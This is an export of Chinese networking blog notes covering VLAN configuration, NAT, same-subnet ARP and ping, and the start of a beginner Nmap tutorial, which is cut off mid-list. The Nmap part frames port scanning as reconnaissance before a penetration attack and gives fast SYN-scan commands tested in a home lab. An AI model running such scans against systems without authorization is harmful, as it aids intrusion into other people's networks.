title="2、设置接入端口模式"></a>2、设置接入端口模式</h2><p>在交换机上进行配置，凡是接研发部门的端口配置为VLAN 10,凡是接人力资源部门的端口配置为VLAN 20</p><pre class=" language-powershell"><code class="language-powershell">int f0<span class="token operator">/</span>1<span class="token operator">-</span>2<span class="token keyword">switch</span><span class="token operator">-</span>port mode access<span class="token keyword">switch</span><span class="token operator">-</span>port access VLAN 10int f0<span class="token operator">/</span>3<span class="token keyword">switch</span><span class="token operator">-</span>port mode access<span class="token keyword">switch</span><span class="token operator">-</span>port access VLAN 20</code></pre><p>这样子配置后，交换机就知道每个VLAN对应哪些端口。</p><p>比如VLAN 10，目前有端口f0/1、f0/2，从这个端口接受到的广播，<br>只会在属于这个VLAN的端口里广播，而不会广播到其他端口。<br>比如端口f0/3不属于VLAN 10，就接受不到端口f0/1、f0/2的广播。</p><p><strong>这就是VLAN最大的作用，可以分割广播域，将不同网段的广播互相隔离开。</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620105755871.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br></p><h2 id="3、设置主干端口模式"><a href="#3、设置主干端口模式" class="headerlink" title="3、设置主干端口模式"></a>3、设置主干端口模式</h2><p>一台交换机内部可以区分哪些端口属于哪些VLAN，可以将特定VLAN的流量只在该VLAN里交换，<font color='blue'> 那么交换机是如何告诉别的交换机哪些流量属于哪个VLAN呢？</font></p><p>很简单，打个标签呐。交换机在以太网帧头域IP报文头之间插入VLAN ID信息，对端的交换机接收到VLAN信息，自然会知道这是属于哪个VLAN的流量，比如对端收到VLAN = 10 的流量，就会在属于VLAN = 10 里进行交换。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620105812274.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre class=" language-powershell"><code class="language-powershell">int f0<span class="token operator">/</span>0<span class="token keyword">switch</span><span class="token operator">-</span>port mode trunk</code></pre><p><br><br></p><h2 id="4、设置路由子接口"><a href="#4、设置路由子接口" class="headerlink" title="4、设置路由子接口"></a>4、设置路由子接口</h2><p>按理来说，每一个广播域需要对应一个路由器的接口，可是现在的情况下，我们相当于多个VLAN都接在一个物理接口上，这该怎么办呢？</p><p>那就在要给路由接口上创建子接口好了。子接口是一种软件接口，要多少有多少，只要给子接口配置IP地址就可以了。</p><pre class=" language-powershell"><code class="language-powershell">int g0<span class="token operator">/</span>1<span class="token punctuation">.</span>10encapsulation 802<span class="token punctuation">.</span>1q 10ip address 10<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0</code></pre><p><strong>这样配置后，每一个VLAN都有对应的路由器子接口，都有相对应的网关帮忙在不同网段之间通信啦</strong><br><br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620110118527.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br><br><br><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p><p>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VLAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络——NAT的妙用（网络地址转换协议）</title>
      <link href="/2020/07/20/ji-suan-ji-wang-luo-nat-de-miao-yong-wang-luo-di-zhi-zhuan-huan-xie-yi/"/>
      <url>/2020/07/20/ji-suan-ji-wang-luo-nat-de-miao-yong-wang-luo-di-zhi-zhuan-huan-xie-yi/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br><strong>本文将针对以下问题逐条进行解答：</strong></p><p>01 IPV4有何实际意义？</p><p>02 为什么需要进行NAT(网络地址转换)？</p><p>03 如何进行网络地址转换？<br><br>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200619234618400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="01-IPV4的用途"><a href="#01-IPV4的用途" class="headerlink" title="01  IPV4的用途"></a>01  IPV4的用途</h2><p>IPV4地址是网络上唯一的地址，通过这些公网IPV4地址，我们能够准确定位到某一台主机。</p><p>那我们知道了地址之后，是不是一定能够找到对方呢？<font color='blue'> 并不是的，比如，你知道你要去的地方是动物园，那你就一定知道去的路嘛？不一定吧，通常情况下我们还得通过地图导航软件来辅助我们到达目的地。</font><br><br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200619234629354.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><font color='blue'> 而在网络上充当这个地图角色的就是路由器们，路由器再知道了公网IPV4地址之后，就会告诉相邻的邻居，邻居再告诉邻居，就这样，一传十，十传百，一张网络的地图就这么产生了。</font></p><p>具体来说，如果小明拥有一个公网IP为：1.1.1.1，那么路由器A因为是直连肯定知道要找小明怎么走。而路由器A不仅自己知道怎么找A，还会告诉路由器B如果你想找小明的话，你就把IP包发给我就好了。以此类推，最后，<strong>路由器D如果想要和小明通信的话，那他把IP包丢给路由器C，路由器C把IP包丢给路由器B，最后路由器B丢给路由器A。</strong></p><p>以上，A -&gt; D 是<strong>路由扩散</strong>的过程，这个过程有路由器上的路由协议完成<br>           D -&gt; A 是用户<strong>IP包接力</strong>的过程，像多米诺骨牌一样，最终找到小明</p><p><strong>现在假设连接在路由器A上的小明 1.1.1.1 要和 连接在路由器D上的小美 2.2.2.2 进行通信，过程是怎么样的呢？</strong><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200619234645210.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>首先小明发送IP包的时候，IP报头里面添加了源IP地址 1.1.1.1 和 目的IP地址 2.2.2.2</p><p>这个IP包，以路由器A为起点开始了寻路，A查路由器，要找2.2.2.2 下一跳是路由器B，于是发给了B，B发给了C，C发给了D。最终IP包被小美接收到了，小美发现对方的IP是 1.1.1.1 ，于是发一个IP包回应对方，这个IP包的地址是这样的：</p><p>目的IP 1.1.1.1<br>源IP    2.2.2.2</p><p>这里要注意一点，IP包途径的路由器必须都得有小明、小美的路由，只要有一跳出现<font color='red'> 路由表缺失或者不正确，就会造成通信的障碍，或IP包无法到达对方，或者IP回包无法回来</font><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200619234659328.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><font color='red'> 当通信出现故障的时候，先要排除是不是路由问题造成的，要保住去向路由、回向路由都要正确无误。</font>我们可以使用Ping、Traceroute这两个中举协同工作，准确找出到底是那台路由器造成的。</p><p><br><br><br></p><h2 id="02-网络地址转换由来"><a href="#02-网络地址转换由来" class="headerlink" title="02 网络地址转换由来"></a>02 网络地址转换由来</h2><p>我们知道，公网IP地址可以帮我们与他人通信。但是现在有一个问题出现：</p><p><font color='red'> 小明是有一个公网IP地址，1.1.1.1，但是小明家里的智能终端很多啊，有IPAD、手机、电脑，每台设备都需要一个IP地址才能工作，这该怎么分呢？</font></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200619234720823.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>有办法，专门负责IP地址分配的国际机构IANA预留了几段地址，专门用于局域网使用，这三段地址分别为:</p><p>10.0.0.0   -   10.255.255.255<br>172.16.0.0  - 172.31.255.255<br>192.168.0.0 - 192.168.255.255</p><p>假设小明家选择了 10.1.1.0/24这个私有网段，在路由器的局域网配置了DHCP服务器，专门用于给终端分配这个网段的地址，其中10.1.1.1为路由器局域网接口的IP，10.1.1.254为广播地址，那么剩下的10.1.1.2 -254这253个地址就可以分配给局域网的终端了。<br><br><br><br></p><h2 id="03-网络地址转换具体流程"><a href="#03-网络地址转换具体流程" class="headerlink" title="03  网络地址转换具体流程"></a>03  网络地址转换具体流程</h2><p><br><br><br><strong>那么这种情况下，如果小明的手机 10.1.1.2 想要访问 小美的网页 http:// 2.2.2.2 ，该如何通信呢？</strong><br><br><br></p><p>1、小明的电脑使用TCP协议来传输HTTP应用，他发出IP报文，其中目的IP为 2.2.2.2  源IP为10.1.1.2，目的端口号为 80，源端口号位 1520<br></p><p>这里的目的端口号可以让小美的TCP找到服务器进程，这里的服务器进程就是网页服务器程序</p><p>这里的源端口号可以让小明的TCP找到对应的浏览器进程，把小美的回复消息转交给该进程<br><br><br><br>2、路由器接收到小明发来的IP报文，路由器发现源IP地址10.1.1.2是私有地址，做地址转换，动态生成地址转换表：</p><p>其中目的IP为 2.2.2.2  源IP从10.1.1.2映射为1.1.1.1，目的端口号为 80，源端口号位 1520</p><p>端口号占两个字节，取值范围是1-65535，端口号1520在路由器上没有被任何本地经常占用，所以小明电脑可以原封不动地使用1520这个端口号。<br><br><br><br>3、经过各个路由器的配合，这个IP报文经过了25跳到达了小美的电脑。</p><p>  但是到达了电脑还没有完呐，因为电脑上的进程特别多，如何知道发给那个进程呢？</p><p><font color='blue'> 举个例子，福建省福州市长乐区XXX37号，这个IP地址告诉你对方在福建省福州市长乐区XXXX，而端口号告诉你对方在37号</font>  </p><p>简单来说，IP地址准确定位电脑，端口号用于准确定位电脑上特定进程，即 IP地址+端口号  ，定位了某一台电脑的某一个进程<br><br><br><br>4、小美的网页服务收到小明的访问网页请求后，回复小明的手机，她打包了一个IP报文，只要把接收到的IP报文，源/目的IP位置调换，源/目的端口互换位置即可</p><p>其中目的IP为 1.1.1.1，  源IP 2.2.2.2，目的端口号为 1520，源端口号为 80<br><br><br><br>5、IP报文到达小明路由器，查NAT映射表，匹配到后做地址替换，替换后的IP报文为：</p><p>目的IP为10.1.1.2，  源IP 1.1.1.1，目的端口号为 1520，源端口号为 80<br><br><br><br>6、最后IP报文到达小明电脑指定端口完成通信</p><p>补充：<br>如果这个时候小明的电脑也要访问小美的网页，恰巧也想将1520作为源端口<strong>会发生什么呢？</strong></p><p>小明电脑发生IP包后，小明路由器接收到该IP报文，发现1520端口已经被占用，于是在端口号空间 1025-65535挑选了一个空闲端口号1521给电脑使用，动态生成NAT表</p><p>如<br>公网IP      私网IP   路由器端口号    主机端口号   存活时间<br>1.1.1.1      10.1.1.2      1520                  1520             237<br>1.1.1.1       10.1.1.3      1521                 1520             300</p><p>这样子，最终呈现在小美电脑上的IP报文格式为：<br>目的IP为2.2.2.2，  源IP 1.1.1.1，目的端口号为 80，源端口号为 1521</p><p>此报文最终可以找到小美的服务器进程，返程的回复报文，小明的路由器也可以查NAT表，做地址转换，最终达到小明的手机<br><br><br><br></p><p><strong>总结一下就是，小明的路由器为了辨别不同用户（IP地址不同）的流量，或者同一个用户的不同流量（端口号不同），使用路由器上唯一的端口号来分辨他们</strong></p><p><br><br><br><br>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络——同网段下的主机通信</title>
      <link href="/2020/07/20/ji-suan-ji-wang-luo-tong-wang-duan-xia-de-zhu-ji-tong-xin/"/>
      <url>/2020/07/20/ji-suan-ji-wang-luo-tong-wang-duan-xia-de-zhu-ji-tong-xin/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br><br></p><p><strong>我们以主机ping的过程举例，设定本地IP地址为10.1.1.1，目标IP地址为10.1.1.3</strong>。<br><br></p><p><strong>针对以下问题逐条进行解答：</strong></p><p><strong>01 Ping是什么？</strong></p><p><strong>02 电脑如何判断ping的IP地址是不是和自己一个网段？</strong></p><p><strong>03 如果ping的IP地址是属于同一个网段，那么数据链路层会做什么？</strong><br><br></p><p>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620002049565.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><br></p><h2 id="01-Ping命令简介"><a href="#01-Ping命令简介" class="headerlink" title="01 Ping命令简介"></a>01 Ping命令简介</h2><br>要了解ping是什么，我们可以先来看一看声纳是什么。<br><br><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020062000214335.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><font color='blue'> 声呐是一种探测物体的技术，通过发射出特定波长的声波来探测物体，比如遇到潜水艇则会反射回来，以此可以定位潜水艇的位置和距离，做出准确的攻击。</font></p><p>ping也是类似的原理。<br>ping包发送出去之后，如果<strong>目的电脑联网</strong>，目的电脑就会将Ping包弹回来；<br>如果<strong>目的电脑没有联网</strong>，拿着这个ping包就会消失在漫漫网络之中。<br><br><strong>由此，我们可以根据两种不同的反应，判断目的电脑是否处于联网状态。</strong><br><br><br><br></p><h2 id="02-判断同一网段的方式"><a href="#02-判断同一网段的方式" class="headerlink" title="02 判断同一网段的方式"></a>02 判断同一网段的方式</h2><br><p>主机会用自己的掩码去遮掩对方的IP地址，<img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020062000215960.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>如果<strong>得到的网络号</strong>和自己<strong>本身的网络号</strong>，是一样的，那就说明10.1.1.3和自己处于同一个网段。<br><br><br><br></p><h2 id="03-相同网段下，数据链路层的动作"><a href="#03-相同网段下，数据链路层的动作" class="headerlink" title="03 相同网段下，数据链路层的动作"></a>03 相同网段下，数据链路层的动作</h2><p>如果是处于同一网段，那么通信这个事情就简单多了。</p><p>①先检查自己的ARP缓存是否有对方网卡的硬件地址MAC，有的话，就进行数据链路层的封装，然后发出去ping包</p><p>②如果ARP缓存里没有，那么就要发个ARP广播询问对方<img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620002213858.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><strong>那么该如何询问呢？</strong></p><p>   1、确定用哪个接口发送广播<br>          通过路由表中网段与接口的对应关系，来确定用哪个接口</p><p>   2、从对应接口发送ARP广播,ARP广播在广播域内蔓延<br>           广播请求10.1.1.3的硬件MAC地址，大声问谁的IP地址是10.1.1.3啊，是的话，把你的MAC地址告诉我</p><p>   3、10.1.1.3收到该广播帧就单播ARP回复10.1.1.1,其他IP地址收到广播帧发现不是找自己，就丢掉ARP包<br>           我的IP地址就是10.1.1.3，我的MAC地址是MACxm</p><p>   4、10.1.1.1收到10.1.1.3的回复，将10.1.1.3/MACxm保存在自己的ARP缓存里，时间为20-30分钟不等，以备下次使用</p><p>就这样，一个Ping包就发送出去了，然后反弹回最大、最小、平均的来回延迟时间RTT<br><br><br><br></p><h2 id="04-拓展知识问答"><a href="#04-拓展知识问答" class="headerlink" title="04 拓展知识问答"></a>04 拓展知识问答</h2><h3 id="1、ARP协议是什么？"><a href="#1、ARP协议是什么？" class="headerlink" title="1、ARP协议是什么？"></a>1、ARP协议是什么？</h3><p>ARP是地址转换协议，用于将已知的IP地址，解析其对应的MAC地址。如果把IP地址看作是网络地址，那么MAC地址就是绑定在网卡上的硬件地址。<br><br></p><h3 id="2、ARP请求为什么是广播而不是单播？"><a href="#2、ARP请求为什么是广播而不是单播？" class="headerlink" title="2、ARP请求为什么是广播而不是单播？"></a>2、ARP请求为什么是广播而不是单播？</h3><p>现在我们的情况是不知道对方到底在哪里，所以我们需要大声呼喊，希望对方能够听到我们的呼喊，然后告诉我们他的位置。具体来说，我们使用广播帧的时候，目的MAC设置为FF.FF.FF.FF.FF.FF，这样可以完成封装</p><p>如果用单播，那就说明我们已经知道了对方的MAC地址，既然知道了，那就不需要用ARP协议了<br><br></p><h3 id="3、广播域是什么？"><a href="#3、广播域是什么？" class="headerlink" title="3、广播域是什么？"></a>3、广播域是什么？</h3><p>通俗来说，就是广播信息可以扩散到的地盘、空间。<br>如果是几台主机连接在一个Hub上，那么这几台主机都处于一个广播域<br>如果是几台主机连接在一个交换机上，如果交换机没有划分VLAN，那么所有的端口都处于默认VLAN ID = 1里，那么这几台主机也都处于一个广播域。如果交换机有52个端口，去掉一个接受端口，交换机要将广播信息复制51次，然后发送出去。</p><br>### 4、ARP应答为什么是单播？<p>因为通过ARP请求，你就可以知道请求者的MAC地址，即对方的MAC地址，所以可以直接使用点对点的单播凡是回答对方</p><p>这里做个比喻，来说明广播和单播</p><p><font color='blue'> 广播通信：如在火车售票大厅寻找走散的情侣，小美焦急大喊到：小明，你在哪里啊？结果整个大厅的人都听到了，小明连忙回音：亲爱的，我在这里 </font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020062000224687.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><font color='blue'> 单播通信：如打电话，尽管肉麻却不会影响到其他人</font><br><br></p><h3 id="5、主机为什么要缓存ARP回答？"><a href="#5、主机为什么要缓存ARP回答？" class="headerlink" title="5、主机为什么要缓存ARP回答？"></a>5、主机为什么要缓存ARP回答？</h3><p>如果不缓存的话，每一次通信就需要一次次地址解析，将会产生更多的广播信息。<br>而缓存下来，在超时时间内可以重复利用。<br>如果有流量刷新超时定时器，则缓存的时间更长，这样可以最大限度减轻广播消息对广播域的影响。</p><p><font color='blue'> 就比如你认识了个朋友，你就还不如先认真记一下他的住址。免得每次去他那里玩，你都需要问。<br>而如果你们已经很久时间没有一起玩了，那么你就会把他的地址忘记，等下次去的时候再问一问</font><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620002304886.jpg#pic_center" alt=""><br><br></p><h3 id="6、RRT-Round-Trip-Time-是什么？"><a href="#6、RRT-Round-Trip-Time-是什么？" class="headerlink" title="6、RRT(Round Trip Time)是什么？"></a>6、RRT(Round Trip Time)是什么？</h3><p>通俗来说，就是一个Ping包从发出去的那一秒开始计时，一直到Ping回包为止，所流逝的时间，以毫秒ms为计时单位。<br>RRT最小、最大、平均值越接近，表明网络越稳定</p><p><br><br><br><br><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p><p>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 同网段通信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零基础使用Nmap进行扫描？你不得不掌握的基础知识</title>
      <link href="/2020/07/20/ling-ji-chu-shi-yong-nmap-jin-xing-sao-miao-ni-bu-de-bu-zhang-wo-de-ji-chu-zhi-shi/"/>
      <url>/2020/07/20/ling-ji-chu-shi-yong-nmap-jin-xing-sao-miao-ni-bu-de-bu-zhang-wo-de-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p><font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br><strong>全篇技术分享纯干货，看完准保你能马上用上Nmap试试手~~</strong></p><p>本篇文章帮你逐个击破以下3个问题：</p><p><strong>01 Nmap是用来干什么的？</strong> </p><p><strong><strong>02 我们能够用Nmap来干什么？</strong></strong></p><p><strong><strong>03 Nmap具体是如何使用的？</strong></strong></p><p><strong>04 Nmap还可以用来干什么？</strong></p><p>话不多说，我们逐个击破。<br>@<a href="为方便您的阅读，可戳下方蓝字，快速跳转">TOC</a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508152358956.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="01-Nmap简介"><a href="#01-Nmap简介" class="headerlink" title="01 Nmap简介"></a>01 Nmap简介</h1><p>Nmap是一款扫描神器，通过使用该工具，我们不仅可以知道某个网段存活的主机、存活主机开放着哪些端口以及服务。除此之外，某些时候我们还可以<font color='red'> 进行目标主机服务器系统版本、操作系统、以及防火墙是否开启的检测。 </font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061606251882.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>也就是说，通过使用Nmap，<strong>IP地址、开放端口、开放服务</strong>等信息都将被你掌握。<br><br><br><br></p><h1 id="02-Nmap的作用"><a href="#02-Nmap的作用" class="headerlink" title="02 Nmap的作用"></a>02 Nmap的作用</h1><p>正所谓，知己知彼，百战百胜。我们在信息收集的初期，可以通过Nmap来进行端口的扫描，确定其存在的服务，方便后续渗透对其主机进行针对性的漏洞测试。</p><p><font color='blue'>  打个比方，就相当于如果你要入室行窃（渗透攻击），那么我们入室之前看看屋子里有哪些地方可以方便进入，是不是有开着什么窗户（端口），开着哪扇门（服务）。这对我们后续动作的进行提供宝贵的参考指标。而这个Nmap就是我们在观察屋子时，使用的望远镜，通过使用这个望远镜，窗户、门口是否开着的情况都被我们牢牢掌握咯。<br><br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616062321619.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><br></p><h1 id="03-Nmap的使用"><a href="#03-Nmap的使用" class="headerlink" title="03 Nmap的使用"></a>03 Nmap的使用</h1><p><br><br></p><h2 id="1-前情提要"><a href="#1-前情提要" class="headerlink" title="1.前情提要"></a>1.前情提要</h2><p>我使用的是虚拟机kali上的nmap，<br>kali系统主机IP地址为192.168.131.133<br>本地windows10主机IP地址为192.168.8.105<br>本次实验，仅有以上两台主机存活</p><p><br><br></p><h2 id="2-基本的具体使用方法"><a href="#2-基本的具体使用方法" class="headerlink" title="2.基本的具体使用方法"></a>2.基本的具体使用方法</h2><p>:</p><p><strong><em>1）扫描某个具体IP地址    我们重点关注返回的端口信息及服务</em></strong></p><p>在这里，nmap<strong>默认发送</strong>的是一个ARP的Ping数据包</p><p>如：<code>nmap   192.168.1.100</code><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508145544804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><strong><em>2）扫描多个IP地址  分别列举</em></strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020050815103026.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p><strong><em>3）扫描某个连续的IP地址   -</em></strong></p><p>如：<code>nmap   192.168.1.100-110</code></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508150446413.png" alt=""><br><strong><em>4）扫描某个网段   加上子网掩码</em></strong><br>如： <code>nmap   192.168.8.0/24</code></p><p>但是呢，实际探测的时候采用以上命令扫描非常耗时。<strong>所以我们可以添加一些相关参数，达到快速扫描的目的。</strong></p><p> 添加相关参数后，我们的命令为：<br>nmap -sS -Pn  -n –open -T4 –min-hostgroup 4 –min-parallelism 1024 –host-timeout 30  192.168.8.0/24</p><p>简单解释相关参数：<br>-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；</p><p>-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；</p><p>-n： 功能未知；</p><p>–open： 只输出检测状态为open的端口，即开放的端口；</p><p>–min-hostgroup 4：调整并行扫描组的大小；</p><p>–min-parallelism 1024：调整探测报文的并行度；</p><p>-T4：总共有T0-T5，T4折中等级<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508160522832.png" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508160540461.png" alt=""><br>在这里我们看到，IP地址为192.168.8.105的主机存活着。</p><p><strong><em>5）扫描除某个IP外的IP地址  -exclude</em></strong></p><pre class=" language-powershell"><code class="language-powershell">nmap <span class="token operator">-</span>sS <span class="token operator">-</span>Pn  <span class="token operator">-</span>n <span class="token operator">--</span>open <span class="token operator">-</span>T4 <span class="token operator">--</span>min<span class="token operator">-</span>hostgroup 4 <span class="token operator">--</span>min<span class="token operator">-</span>parallelism 1024 <span class="token operator">--</span>host<span class="token operator">-</span>timeout 30  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>8<span class="token punctuation">.</span>0<span class="token operator">/</span>24  <span class="token operator">-</span>exclude 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>100<span class="token punctuation">.</span>2</code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508162152986.png" alt=""><br>在这里，可以看到在添加了-excluede参数后，192.168.8.105端口<strong>被排除扫描了</strong>，没有被扫描出来</p><p><strong><em>6）扫描某一目标地址的指定端口  -p</em></strong></p><p>如：<code>nmap   192.168.8.105  -p 21</code><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508153129251.png" alt=""><br><strong><em>7）扫描目标地址的在线情况  -sP  